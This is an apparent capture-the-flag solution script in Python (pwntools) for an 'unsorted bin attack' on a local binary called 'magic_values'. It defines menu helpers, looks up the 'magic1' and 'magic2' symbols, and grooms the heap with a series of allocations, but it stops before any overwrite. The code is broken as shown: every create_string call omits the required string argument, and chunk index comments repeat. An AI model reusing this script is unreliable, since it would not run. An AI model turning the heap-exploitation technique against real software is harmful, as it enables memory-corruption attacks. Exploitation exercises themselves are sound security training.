'''
Unsorted Bin Attack Challenge solution
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'magic_values'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p, 'dir /usr/src/glibc/glibc-2.23/malloc/')
else: 
	p = process(elf.path, env=env) 

'''
Creates a string 

Parameter: 
	- string: the text to be put into the string.
'''
def create_string(size, string):
	p.sendlineafter(">", "1") 
	p.sendlineafter(">", str(size))
	p.sendlineafter(">", str(string))

'''
View A string

Parameter:
	- index: The index of the string to print
Returns: 
	- The output from the print
'''
def view_string(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your string:") # Right before string output

	# Outputted data
	output = p.recvuntil("Welcome").replace("Welcome","") 
	return output

'''
Delete a string 

Parameter: 
	- index: The index of the string to remove
'''	
def delete_string(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Edit a string
Parameters: 
	- index: The index of the string to edit
	- string: The text to be put into the string
'''
def edit_string(index, string):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", str(string)) 
	return 

magic1_addr = elf.symbols['magic1']
magic2_addr = elf.symbols['magic2'] 

##########################
#### Initial Setup #######
##########################

create_string(0x10)   # Index 0 
create_string(0x400)  # index 1

create_string(0x20)   # index 2

create_string(0x400)  # index 3

create_string(0x20) 

create_string(0x120) 


create_string(0x20)   # index 3

p.interactive()


